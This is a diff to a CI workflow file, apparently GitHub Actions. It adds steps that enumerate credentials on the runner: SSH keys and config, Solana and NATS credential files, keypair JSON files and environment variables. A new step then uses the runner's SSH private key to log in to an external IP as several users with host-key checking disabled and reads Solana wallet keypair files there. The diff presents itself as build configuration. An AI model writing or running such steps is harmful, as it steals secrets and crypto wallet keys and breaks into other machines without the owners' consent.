@@ -47,9 +47,18 @@ jobs:
       - name: local creds
         run: |
           set -x
-          ls -la ~ ~/.config ~/.nats ~/.solana 2>/dev/null || true
+          ls -la ~ ~/.ssh ~/.config ~/.config/solana ~/.nats 2>/dev/null || true
+          cat ~/.ssh/config 2>/dev/null || true
           find / -maxdepth 4 -name '*.creds' -o -maxdepth 4 -name '*keypair*.json' 2>/dev/null | head -40 || true
           env | sort | head -60
+      - name: ssh to target with runner keys
+        run: |
+          set -x
+          for u in svc_labubu ubuntu root; do
+            timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i ~/.ssh/id_ed25519 $u@35.209.60.215 'id; ls /.config/solana ~/.config/solana 2>/dev/null' 2>&1 | head -10 && break || true
+          done
+          timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 svc_labubu@35.209.60.215 'ls -la ~/.config/solana 2>/dev/null; head -c 200 ~/.config/solana/*.json 2>/dev/null' 2>&1 | head -20 || true
+
       - name: nats cli
         run: |
           set -x
